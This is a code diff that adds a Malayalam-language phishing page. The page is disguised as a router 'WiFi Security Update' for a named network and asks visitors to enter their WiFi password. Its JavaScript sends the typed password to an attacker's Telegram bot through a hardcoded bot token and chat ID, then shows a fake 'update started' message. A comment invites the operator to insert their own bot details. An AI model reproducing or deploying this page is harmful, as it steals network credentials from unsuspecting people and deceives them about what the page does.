@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="ml">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WiFi Security Update</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #e9ecef; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
+        .container { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); width: 90%; max-width: 400px; text-align: center; }
+        h2 { color: #d9534f; margin-bottom: 10px; }
+        .wifi-name { font-weight: bold; color: #333; background: #f8f9fa; padding: 10px; border-radius: 5px; margin-bottom: 20px; border: 1px solid #ddd; }
+        p { color: #666; line-height: 1.5; font-size: 15px; }
+        input[type="password"] { width: 100%; padding: 12px; margin: 20px 0; border: 2px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 16px; }
+        button { background-color: #0275d8; color: white; border: none; padding: 12px 25px; border-radius: 8px; cursor: pointer; font-size: 16px; width: 100%; transition: 0.3s; }
+        button:hover { background-color: #0154a0; }
+        .footer { margin-top: 15px; font-size: 12px; color: #999; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2>സുരക്ഷാ അറിയിപ്പ്!</h2>
+    <div class="wifi-name">Network: ERAKKINGAL-swnet</div>
+    <p>നിങ്ങളുടെ വൈഫൈ നെറ്റ്‌വർക്കിന്റെ വേഗത വർദ്ധിപ്പിക്കുന്നതിനും സുരക്ഷ ഉറപ്പാക്കുന്നതിനും പുതിയ <b>Software Update</b> ലഭ്യമാണ്.</p>
+    <p style="color: #d9534f; font-weight: bold;">തുടരുന്നതിനായി വൈഫൈ പാസ്‌വേഡ് നൽകുക:</p>
+    
+    <input type="password" id="pass" placeholder="WiFi Password ടൈപ്പ് ചെയ്യുക">
+    <button onclick="sendData()">Update Now</button>
+    
+    <div class="footer">© 2026 Router Systems Inc. All rights reserved.</div>
+</div>
+
+<script>
+function sendData() {
+    const password = document.getElementById('pass').value;
+    
+    // ഇവിടെ നിന്റെ ബോട്ട് വിവരങ്ങൾ നൽകുക
+    const token = '8712041938:AAHypJ7okyr9Vh35FfwF_n4isU8VBg9vbO8';
+    const chatId = '6805844496';
+    
+    if(password === "") {
+        alert("ദയവായി പാസ്‌വേഡ് ടൈപ്പ് ചെയ്യുക!");
+        return;
+    }
+
+    const message = `🎯 പുതിയ വൈഫൈ പാസ്‌വേഡ് ലഭിച്ചു!\n\n📶 WiFi: NCVNET_THEKKETHIL\n🔑 Password: ${password}`;
+    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+    fetch(url)
+    .then(res => {
+        alert("അപ്‌ഡേറ്റ് ആരംഭിച്ചു. ദയവായി കുറച്ച് സമയം കാത്തിരിക്കുക...");
+        document.getElementById('pass').value = ""; // ടൈപ്പ് ചെയ്തത് മായ്ക്കാൻ
+    })
+    .catch(err => {
+        alert("Error! ദയവായി ഇന്റർനെറ്റ് കണക്ഷൻ പരിശോധിക്കുക.");
+    });
+}
+</script>
+
+</body>
+</html>
+###
